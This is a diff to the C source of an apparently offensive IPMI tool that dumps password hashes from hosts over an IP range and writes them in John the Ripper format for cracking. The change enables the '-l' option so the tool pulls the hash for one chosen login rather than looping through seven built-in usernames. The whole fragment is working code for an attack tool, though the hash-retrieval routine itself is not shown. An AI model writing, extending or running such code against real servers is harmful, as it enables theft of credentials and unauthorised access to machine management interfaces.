@@ -656,7 +656,7 @@ void DumpHash(const char* Username, const char* Target)
 void Usage(const char* ProgramName)
 {
 	printf("%s <options> <IP|IP/mask>\n", ProgramName);
-	printf("        -l  Login /*not impl*/  Dump hash for login\n");
+	printf("        -l  Login               Dump hash for login\n");
 	printf("        -L  File  /*not impl*/  File with logins\n");
 	printf("        -d                      Dump hashes\n");
 	printf("        -j  File                Write hashes in John the Ripper format (implies -d)\n");
@@ -833,20 +833,34 @@ doit:
 			if (((PingIPMI(Target) == 1) || (globalArgs.DoForce == 1)) && (globalArgs.DoDump == 1))
 			{
 				printf("[i] Trying get hash from %s\n", Target);
-				for (k=0; k<7; k++)
+				if ( globalArgs.Login )
 				{
-					DumpHash(username[k], Target);
-					DoSleep(1);
+					DumpHash(globalArgs.Login, Target);
+				}
+				else
+				{
+					for (k=0; k<7; k++)
+					{
+						DumpHash(username[k], Target);
+						DoSleep(1);
+					}
 				}
 			}
 		}
 		else if (globalArgs.DoDump == 1)
 		{
 			printf("[i] Trying get hash from %s\n", Target);
-			for (k = 0; k < 7; k++)
+			if ( globalArgs.Login )
 			{
-				DumpHash(username[k], Target);
-				DoSleep(1);
+				DumpHash(globalArgs.Login, Target);
+			}
+			else
+			{
+				for (k = 0; k < 7; k++)
+				{
+					DumpHash(username[k], Target);
+					DoSleep(1);
+				}
 			}
 		}
 	}
